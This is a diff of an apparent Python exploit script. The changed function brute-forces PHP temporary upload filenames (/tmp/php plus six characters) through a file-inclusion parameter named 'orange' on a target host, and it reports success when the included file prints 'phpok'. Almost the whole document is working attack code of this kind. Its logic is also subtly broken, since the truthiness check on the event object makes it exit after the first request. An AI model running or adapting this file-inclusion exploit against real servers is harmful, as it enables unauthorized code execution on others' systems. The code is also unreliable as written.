@@ -34,22 +34,17 @@ def upload_file_to_include():
     return r.status_code
 
 
-def brute_force_tmp_file(charset):
-    for a in charset:
-        for b in charset:
-            for c in charset:
-                for d in charset:
-                    for e in charset:
-                        for f in charset:
-                            suffix = a + b + c + d + e + f
-                            url = f"{HOST}?orange=/tmp/php{suffix}"
-                            r = requests.get(url)
-                            if 'phpok' in r.text:
-                                print("\033[32m[+] Include success!\033[0m")
-                                print(f"The filename is /tmp/php{suffix}")
-                                event.set()
-                            if event:
-                                sys.exit(0)
+def brute_force_tmp_file(chars):
+    suffixs = [''.join(x) for x in itertools.permutations(chars, 6)][::-1]
+    for suffix in suffixs:
+        url = f"{HOST}?orange=/tmp/php{suffix}"
+        r = requests.get(url)
+        if 'phpok' in r.text:
+            print("\033[32m[+] Include success!\033[0m")
+            print(f"The filename is /tmp/php{suffix}")
+            event.set()
+        if event:
+            sys.exit(0)
 
 
 def main():
